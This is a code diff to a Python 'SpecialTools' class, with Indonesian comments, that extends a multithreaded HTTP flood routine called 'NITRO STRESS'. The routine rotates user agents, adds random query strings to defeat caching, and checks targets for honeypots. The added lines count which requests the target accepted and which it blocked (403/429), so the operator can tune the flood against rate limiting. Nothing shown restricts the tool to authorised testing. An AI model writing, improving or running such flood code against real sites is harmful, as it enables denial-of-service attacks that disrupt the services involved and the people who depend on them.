@@ -14,6 +14,7 @@ class SpecialTools:
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
             "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
         ]
+        self.stats = {"success": 0, "blocked": 0, "error": 0, "redirect": 0}
 
     # * Deteksi HoneyPot (Advanced Delay Measurement)
     def detectHoneypot(self, target):
@@ -28,6 +29,7 @@ class SpecialTools:
     # * Nitro Stress Engine (Porting from Destroyer/Agile Profile)
     def runNitroStress(self, targetUrl, duration=15, threads=50):
         self.isFlooding = True
+        self.stats = {"success": 0, "blocked": 0, "error": 0, "redirect": 0}
         print(f"[*] Starting NITRO STRESS on {targetUrl} with {threads} threads.")
         
         def attack_worker():
@@ -59,9 +61,16 @@ class SpecialTools:
                     connector = '&' if '?' in targetUrl else '?'
                     test_url = f"{targetUrl}{connector}nitro={random_str}"
                     
-                    session.get(test_url, headers=headers, timeout=3, allow_redirects=True)
+                    resp = session.get(test_url, headers=headers, timeout=3, allow_redirects=True)
+                    
+                    code = resp.status_code
+                    if code == 200: self.stats["success"] += 1
+                    elif code == 403 or code == 429: self.stats["blocked"] += 1
+                    elif 300 <= code < 400: self.stats["redirect"] += 1
+                    else: self.stats["error"] += 1
+                    
                 except Exception:
-                    pass
+                    self.stats["error"] += 1
             session.close()
 
         # Launch Threads
